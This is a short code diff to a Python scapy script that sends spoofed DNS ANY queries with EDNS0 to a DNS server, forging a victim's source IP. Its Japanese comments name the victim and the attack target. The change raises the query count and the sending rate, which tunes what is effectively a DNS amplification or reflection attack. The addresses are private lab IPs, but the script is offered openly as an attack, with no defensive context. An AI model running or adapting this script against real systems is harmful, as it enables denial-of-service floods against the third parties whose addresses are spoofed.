@@ -1,4 +1,5 @@
 from scapy.all import *
+
 import random
 import time
 
@@ -30,8 +31,8 @@ def send_spoofed_dns_any_edns0(victim_ip, dns_server_ip, qname, count=5, interva
 victim_ip = "192.168.11.100"       # 偽装された送信元IP（被害者）
 dns_server_ip = "192.168.11.53"    # DNSサーバIP（攻撃対象）
 domain = "takkesan.com"            # 問い合わせ対象ドメイン
-send_count = 5                     # クエリ送信回数
-send_interval = 0.5                # 送信間隔（秒）
+send_count = 100                   # クエリ送信回数
+send_interval = 0.1                # 送信間隔（秒）
 
 # ====== 実行 ======
 send_spoofed_dns_any_edns0(victim_ip, dns_server_ip, domain, count=send_count, interval=send_interval)
